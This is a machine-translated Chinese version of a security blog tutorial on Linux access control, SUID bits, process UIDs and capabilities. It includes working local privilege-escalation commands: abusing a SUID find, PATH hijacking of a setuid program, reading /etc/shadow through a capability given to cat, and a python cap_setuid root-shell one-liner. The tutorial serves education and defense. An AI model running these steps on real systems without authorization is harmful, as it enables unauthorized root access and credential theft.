<html>
<head>
<title>Understanding Privilege Escalation by Abusing Linux Access Control</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过滥用Linux访问控制了解权限提升</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/understand-privilege-escalation-by-abusing-linux-access-control-6cab107e7203?source=collection_archive---------1-----------------------#2022-11-11">https://infosecwriteups.com/understand-privilege-escalation-by-abusing-linux-access-control-6cab107e7203?source=collection_archive---------1-----------------------#2022-11-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/0362f90363a23eadd1ac4af16715bcf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1sirW8JUPXhA3sop8gYqLQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">(<a class="ae kc" href="https://wallhere.com/en/wallpaper/1933281" rel="noopener ugc nofollow" target="_blank">https://wallhere.com/en/wallpaper/1933281</a></figcaption></figure><p id="f478" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在Linux系统上，特权提升是一种技术，通过这种技术，无特权的用户可以获得提升权限的非法访问，Linux访问控制错误配置可以被利用来达到目的。。在这篇博文中，您将对Linux访问控制机制、如何利用suid和sgid二进制文件获得提升的权限、uid/suid/euid篡改以及不受限制的Linux功能有一个初步的了解。</p><h1 id="a0ac" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">资源和所有权</h1><p id="bf7a" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">在进入访问控制机制之前，首先要弄清楚关于文件、用户和进程的一些基本概念。Linux操作系统由文件组成(一切都是文件)。文件有一个所有者，默认为创建它的用户。每个用户都与一个可以访问文件的用户ID相关联。人类用户可以使用用户帐户登录。进程是内核加载执行的程序，进程可以作为用户帐户运行。Linux中用户、进程和文件之间的高级关系描述如下:</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/1a42e9e42c09494489d96f348f342b7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TZJVB661l0Z1t5fyHiWBuw.png"/></div></div></figure><h1 id="a73e" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">访问控制的类型</h1><p id="46c4" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">Linux是一个多用户操作系统，它为文件定义了三种访问权限(读、写和执行)来保护它们。有两种最重要的访问控制类型DAC(自主访问控制)和MAC(强制访问控制):</p><ul class=""><li id="94fe" class="mj mk iq kf b kg kh kk kl ko ml ks mm kw mn la mo mp mq mr bi translated">自主访问控制(DAC)</li></ul><p id="8055" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">自由访问控制基于用户和/或组成员的身份限制对文件的访问。因为文件所有者可以将访问权转让给其他用户，所以DAC是任意的。</p><ul class=""><li id="bff1" class="mj mk iq kf b kg kh kk kl ko ml ks mm kw mn la mo mp mq mr bi translated">强制访问控制(MAC)</li></ul><p id="ef43" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在MAC中，访问是基于数据机密性和用户许可级别的，换句话说，用户被分配一个许可级别，文件被分配一个安全标签，当用户试图访问一个特定的文件时，Linux将检查用户的许可级别和文件的安全标签来决定是否提供访问。只有管理员配置这些访问策略并实施访问控制，而不是文件的所有者。MAC不是这篇博文的重点。</p><h1 id="6c84" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">DAC中的文件权限位</h1><p id="41eb" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">文件的所有者(创建者)、文件所属组的成员以及其他所有人都可以访问文件。一个文件总是由一个用户d(u)和一个组(g)以及其他人(o)所拥有。有三种常见的访问类型:r(读)、w(写)和x(执行)权限。因此，有九位信息来描述文件权限。例如:</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/ae9dfeb8c3951db3a7117557d4d757e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Uji8r3Xc_kZ9xpGyOkUr3g.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">(https://danielmiessler.com/images/permissions.png)</figcaption></figure><p id="042a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">除了r/w/x，Linux引入了三个额外的特殊位:setuid(又名SUID)、setgid(又名SGID)和sticky，以实现额外的限制或特权。<code class="fe mt mu mv mw b">setuid</code>位只是表示当运行一个可执行文件时，它会将其权限设置为所有者的权限，而不是设置为启动它的用户的权限。<code class="fe mt mu mv mw b">setgit</code>为可执行文件分配拥有它的组的权限，而不是执行它的用户组的权限。如果对文件应用了粘滞位，则只有所有者或根用户可以删除该文件。</p><p id="f69c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们看一些“ls -l”的样本结果来说明上面的概念:</p><p id="4e32" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">例1: </strong></p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="33ce" class="nb lc iq mw b be nc nd l ne nf">drwxrwxrwx 1 someuser somegroup 9 Apr 11 10:56 test</span></pre><p id="7292" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">文件所有者为<code class="fe mt mu mv mw b">someuser</code>，文件组为<code class="fe mt mu mv mw b">somegroup</code></p><p id="f42b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe mt mu mv mw b">drwxrwxrwx</code>是权限位，第一个字符表示文件的类型:</p><ul class=""><li id="5e4d" class="mj mk iq kf b kg kh kk kl ko ml ks mm kw mn la mo mp mq mr bi translated">-对于常规文件</li><li id="b72b" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">d代表目录文件</li><li id="c060" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">b为块专用设备文件</li><li id="69b7" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">对于字符专用设备文件</li><li id="1ead" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">l表示符号链接</li><li id="752e" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">p代表命名管道(用mkfifo创建)</li><li id="7818" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">s代表插座</li><li id="f842" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated">？对于其他(未知)文件类型</li></ul><p id="3768" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">例2: </strong></p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="f9ee" class="nb lc iq mw b be nc nd l ne nf">drwsrwxrwx 1 someuser somegroup 9 Apr 11 10:56 test</span></pre><p id="1093" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">正如您可以在文件权限的用户部分看到的一个<code class="fe mt mu mv mw b">s</code>,<code class="fe mt mu mv mw b">s</code>是setuid位。有时您可能会看到<code class="fe mt mu mv mw b">S</code>，这意味着setuid位打开，而用户执行位关闭。</p><p id="2bd8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">例3: </strong></p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="03cf" class="nb lc iq mw b be nc nd l ne nf">drwxrwxrwt 1 someuser somegroup 9 Apr 11 10:56 test</span></pre><p id="b9bb" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">权限表的末尾有一个<code class="fe mt mu mv mw b">t</code>。类似地，当sticky位打开且其他位的执行位关闭时，使用<code class="fe mt mu mv mw b">T</code>。</p><h1 id="d2cc" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SUID位上的权限提升示例</h1><p id="192d" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">带有SUID的可执行文件也称为SUID可执行文件。由于SUID可执行文件的性质，它总是攻击者利用特权提升的目标。您可以使用下面的命令来查找所有的SUID可执行文件:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="c0c5" class="nb lc iq mw b be nc nd l ne nf">[test@InfoSecTest01 tmp]$ find / -perm -u=s -type f 2&gt;/dev/null<br/>.... <br/>/usr/bin/passwd<br/>/usr/bin/sudo<br/>/usr/bin/crontab<br/>/usr/bin/mount<br/>/usr/bin/umount<br/>/usr/bin/chsh<br/>/usr/bin/find<br/>/usr/bin/gpasswd<br/>...</span></pre><p id="07b0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">奇怪的是结果列表中的<code class="fe mt mu mv mw b">find</code>命令，通常<code class="fe mt mu mv mw b">find</code>命令不应该分配suid位。检查<code class="fe mt mu mv mw b">find</code>命令:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="0632" class="nb lc iq mw b be nc nd l ne nf">[test@InfoSecTest01 tmp]$ ls -al /usr/bin/find<br/>-rwsr-xr-x. 1 root root 199304 Oct 31  2018 /usr/bin/find</span></pre><p id="1889" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">接下来，您可以按照下面的步骤尝试执行权限提升:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="0518" class="nb lc iq mw b be nc nd l ne nf">[test@InfoSecTest01 tmp]$ touch priv<br/>​<br/>[test@InfoSecTest01 tmp]$ find priv -exec "id" \;<br/>uid=3017(test) gid=3017(test) euid=0(root) groups=3017(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>​<br/>[test@InfoSecTest01 tmp]$ find priv -exec "whoami" \;<br/>root</span></pre><p id="cc93" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">据观察，<code class="fe mt mu mv mw b">find priv -exec "id" \;</code>结果中的<code class="fe mt mu mv mw b">euid=0(root)</code>我们将在进程许可部分解释euid的含义。</p><h1 id="5597" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">DAC中的处理权限</h1><p id="1b49" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">现在我们将焦点从文件转移到进程，从进程的角度来看权限。</p><p id="de69" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">每个流程都有三个不同的uid:</p><ul class=""><li id="570c" class="mj mk iq kf b kg kh kk kl ko ml ks mm kw mn la mo mp mq mr bi translated"><strong class="kf ir"> Real UID (ruid) </strong>:产生进程的用户的UID，代表进程(不是文件)的所有权。</li><li id="1c37" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated"><strong class="kf ir">有效UID (euid) </strong>:决定当前进程在访问资源时的权限级别。</li><li id="fda0" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated"><strong class="kf ir">保存的set-user-ID (suid) </strong>:当一个进程通过在它的真实uid和保存的set-user-ID中的值之间来回切换它的有效UID来承担不同的特权时，使用它</li></ul><p id="1d19" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们用<code class="fe mt mu mv mw b">/usr/bin/passwd</code>来解释这三个uid。检查<code class="fe mt mu mv mw b">/usr/bin/passwd</code>的权限，可以看到setuid位被启用。</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="0c08" class="nb lc iq mw b be nc nd l ne nf">-rwsr-xr-x. 1 root root 27856 Apr  1  2020 /usr/bin/passwd</span></pre><p id="db14" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe mt mu mv mw b">/usr/bin/passwd</code>归root所有，正如我们上面提到的，setuid位表示当无权限用户执行它时，它将以root的权限运行，这是因为EUid被设置为所有者(root)的ID(就像上面利用<code class="fe mt mu mv mw b">find</code>命令的利用示例中的<code class="fe mt mu mv mw b">euid=0(root)</code>)。同时，RUID被设置为调用者(非特权用户)，但通常time /usr/bin/passwd希望在调用者(非特权用户)的上下文中执行操作，而不是在所有者(root)的上下文中，它将其EUID切换到RUID(非特权用户)。为了防止其原始EUID(根的ID)的丢失，在进程将其EUID更改为RUID(非特权用户)之前，其实际上将原始EUID(根的ID)保存在已保存的用户id (SUID)中。因此，如果该进程完成了它的非特权工作，它可以通过访问SUID来重新获得它的超级用户特权。</p><p id="ad3f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是根用户的临时EUID允许程序/文件有足够的能力让攻击者执行权限提升。</p><p id="a812" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您可以使用内置子例程在自己的C程序中获取和设置进程uid:</p><blockquote class="nl nm nn"><p id="f954" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq"> uid_t geteuid(void) —获取EUID </em></p><p id="fcd8" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq"> uid_t getuid(void) —获取RUID </em></p><p id="38b8" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq"> uid_t getresuid(void) —获取EUID、鲁伊德和SUID </em></p><p id="7caf" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq">int setuid(uid _ t</em>uid<em class="iq">)—所有与进程相关的用户id都被设置为</em> uid <em class="iq">(由超级用户执行时)</em></p><p id="d3db" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq">int seteuid(uid _ t</em>euid<em class="iq">)—将调用进程的有效用户id设置为euid </em></p><p id="2e13" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq">int setre uid(uid _ t</em>ruid<em class="iq">，uid_t </em> euid <em class="iq"> ) —设置调用进程</em>的真实有效的用户标识</p><p id="279f" class="kd ke no kf b kg kh ki kj kk kl km kn np kp kq kr nq kt ku kv nr kx ky kz la ij bi translated"><em class="iq"> … </em></p></blockquote><p id="8fe6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">注意:设置uid是一个复杂的部分，这些子例程的行为在不同的场景下会有所不同，而且uid可能并不总是设置成功，所以要经常检查返回值。</p><h1 id="1ec8" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">进程UID的权限提升示例</h1><p id="6658" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">假设您作为用户<code class="fe mt mu mv mw b">test</code>在/tmp下发现了一个名为<code class="fe mt mu mv mw b">worker</code>的可疑SUID可执行文件:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="bf91" class="nb lc iq mw b be nc nd l ne nf">test@debian:/tmp$ ls -l<br/>-rwsr-xr-x 1 root root  16664 Nov  9 23:06 worker<br/>-rw-r--r-- 1 root root     71 Nov  9 23:06 worker.c</span></pre><p id="7789" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">worker.c是<code class="fe mt mu mv mw b">worker</code>的源代码，检查其内容:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="47aa" class="nb lc iq mw b be nc nd l ne nf">test@debian:/tmp$ cat worker.c<br/>#include &lt;unistd.h&gt;<br/>void main(void){<br/>  setuid(0);<br/>  system("exp");<br/>}</span></pre><p id="4854" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当无权限用户执行<code class="fe mt mu mv mw b">worker</code>程序时，会以EUID 0和SUID 0启动，在<code class="fe mt mu mv mw b">worker.c</code>程序内部调用setuid(0)提升权限后，下一行的外部<code class="fe mt mu mv mw b">system("exp")</code>将以root权限执行。</p><p id="f110" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要利用它，只需在/tmp目录中将<code class="fe mt mu mv mw b">/bin/sh</code>复制为<code class="fe mt mu mv mw b">exp</code></p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="afba" class="nb lc iq mw b be nc nd l ne nf">test@debian:/tmp$ cp /bin/sh ./exp</span></pre><p id="5c66" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后设置<code class="fe mt mu mv mw b">PATH</code> env。</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="11e3" class="nb lc iq mw b be nc nd l ne nf">test@debian:/tmp$ PATH=.:$PATH</span></pre><p id="9829" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">再次执行它，您将获得根权限。</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="1970" class="nb lc iq mw b be nc nd l ne nf">test@debian:/tmp$ ./worker<br/>test@debian:/tmp$ id<br/>uid=0(root) gid=1001(test) groups=1001(test)</span></pre><p id="e1fc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">其他漏洞，如<a class="ae kc" href="https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2" rel="noopener ugc nofollow" target="_blank">共享对象/库注入</a>或<a class="ae kc" href="https://github.com/RackunSec/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/linux.md#mounted-filesystems-with-setuid" rel="noopener ugc nofollow" target="_blank">使用SetUID </a>挂载文件系统，都依靠类似的技术来提升权限。</p><h1 id="1f1e" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">DAC的缺点</h1><p id="9c2f" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">DAC有其缺点，它只提供3种权限——读、写和执行。一个进程(例如<code class="fe mt mu mv mw b">/usr/bin/passwd</code>)被授予root权限，它可能只需要这些权限中的一小部分，过于宽松的权限会带来安全隐患。所以Linux功能来加强Linux系统的安全性。</p><h1 id="b6d1" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Linux分解根权限的能力</h1><p id="87c7" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">Linux中的功能用于为非特权进程提供对内核资源的细粒度访问。它将根权限分解成小的权限，因此只有一部分根权限可以授予目标。列出了大约40种能力<a class="ae kc" href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="noopener ugc nofollow" target="_blank">https://man7.org/linux/man-pages/man7/capabilities.7.html</a>。滥用这些能力使得恶意行为者能够轻易突破安全限制。例如，CAP_DAC_READ_SEARCH功能允许进程绕过文件读取、目录读取和执行权限。如果一个程序(例如<code class="fe mt mu mv mw b">/bin/cat</code>)碰巧具有这种能力，它可以让无权限的用户读取包含机密信息的文件，如/etc/shadow。</p><p id="9cf2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有三个CLI实用程序来管理Linux中的功能:</p><ul class=""><li id="0091" class="mj mk iq kf b kg kh kk kl ko ml ks mm kw mn la mo mp mq mr bi translated"><strong class="kf ir"> capsh </strong> —打印当前上下文的功能</li><li id="97f8" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated"><strong class="kf ir"> setcap </strong> —设置或取消设置常规文件的功能</li><li id="fa75" class="mj mk iq kf b kg ng kk nh ko ni ks nj kw nk la mo mp mq mr bi translated"><strong class="kf ir"> getcap </strong> —从文件或目录中递归获取功能</li></ul><p id="10a9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们将在<code class="fe mt mu mv mw b">/bin/cat</code>上使用这些CLI实用程序来展示CAP_DAC_READ_SEARCH功能如何帮助攻击者绕过文件读取权限。</p><p id="f530" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如您所知，<code class="fe mt mu mv mw b">/etc/shadow</code>是从非特权用户<code class="fe mt mu mv mw b">test</code>处窃取的:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="9c90" class="nb lc iq mw b be nc nd l ne nf">test@machine1:/~$ /bin/cat /etc/shadow<br/>/bin/cat: /etc/shadow: Permission denied</span></pre><p id="16cf" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">假设root错误地将CAP_DAC_READ_SEARCH能力分配给了<code class="fe mt mu mv mw b">/bin/cat</code>。为了得到错误配置的<code class="fe mt mu mv mw b">/bin/cat</code>，切换到root，并授予CAP_DAC_READ_SEARCH能力给<code class="fe mt mu mv mw b">/bin/cat</code>。</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="7d1c" class="nb lc iq mw b be nc nd l ne nf">root@machine1:~$ setcap cap_dac_read_search=eip /bin/cat</span></pre><p id="7073" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">奇怪的<code class="fe mt mu mv mw b">=eip</code>后缀是什么意思？这需要挖掘能力的本质，<code class="fe mt mu mv mw b">e</code>、<code class="fe mt mu mv mw b">i</code>、<code class="fe mt mu mv mw b">p</code>是指<em class="no">有效</em>、<em class="no">可继承</em>和<em class="no">已提交</em>的能力集。对功能集的解释超出了这篇博文的范围。上面的命令将CAP_DAC_READ_SEARCH功能添加到<code class="fe mt mu mv mw b">/bin/cat</code>的这三个功能集中。</p><p id="f44c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">验证CAP_DAC_READ_SEARCH功能已成功授予<code class="fe mt mu mv mw b">/bin/cat</code>:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="b1ba" class="nb lc iq mw b be nc nd l ne nf">root@machine1:~$ getcap /bin/cat<br/>/bin/cat cap_dac_read_search=eip</span></pre><p id="61bc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在切换回普通用户<code class="fe mt mu mv mw b">test</code>并再次尝试<code class="fe mt mu mv mw b">/etc/shadow</code>上的<code class="fe mt mu mv mw b">/bin/cat</code>命令，现在用户<code class="fe mt mu mv mw b">test</code>可以访问<code class="fe mt mu mv mw b">/etc/shadow</code>:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="dcd7" class="nb lc iq mw b be nc nd l ne nf">test@machine1:/~$ /bin/cat /etc/shadow<br/>root:*:19140:0:99999:7:::<br/>daemon:*:18964:0:99999:7:::<br/>bin:*:18964:0:99999:7:::<br/>...</span></pre><h1 id="c475" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Linux功能错误配置的权限提升示例</h1><p id="e28f" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">除了上面的例子，让我们通过另一个例子来理解Linux功能错误配置导致的特权提升。</p><p id="f3fe" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">列出python3，你发现它没什么特别的。</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="ce54" class="nb lc iq mw b be nc nd l ne nf">test@machine1:/~$ ls -al /usr/bin/python3<br/>lrwxrwxrwx 1 root root 9 Apr  5  2021 /usr/bin/python3 -&gt; python3.9<br/>test@machine1:/~$ ls -al /usr/bin/python3.9<br/>-rwxr-xr-x 1 root root 5479736 Mar  1  2021 /usr/bin/python3.9</span></pre><p id="797f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要搜索具有功能的二进制文件，可以选择如下命令:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="4ebe" class="nb lc iq mw b be nc nd l ne nf">test@machine1:/~$ getcap -r / 2&gt;/dev/null<br/>/usr/bin/python3.9 cap_setuid=ep</span></pre><p id="c822" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">幸运的是，python3.9具有cap_setuid功能，cap_setuid意味着可以设置所创建进程的EUID，因此利用该权限，您可以使用如下方法提升到高权限:</p><pre class="mf mg mh mi gt mx mw my bn mz na bi"><span id="bd10" class="nb lc iq mw b be nc nd l ne nf">test@machine1:/~$ python3  -c 'import os; os.setuid(0); os.system("/bin/bash")'<br/>root@machine1:/~$ id<br/>uid=0(root) gid=1001(test) groups=1001(test)</span></pre><p id="f38d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在您已经获得了root权限！</p><p id="c4ae" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在网上搜索，您会发现许多非root用户滥用各种Linux功能来提升权限的例子。</p><h1 id="3708" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最后的想法</h1><p id="d30f" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">如果您有任何问题或反馈，请随时发表评论。如果你认为这篇博文有帮助，请点击拍手👏按钮下面几下，以示支持！</p></div><div class="ab cl ns nt hu nu" role="separator"><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx"/></div><div class="ij ik il im in"><h2 id="9ae6" class="nz lc iq bd ld oa ob dn lh oc od dp ll ko oe of lp ks og oh lt kw oi oj lx ok bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>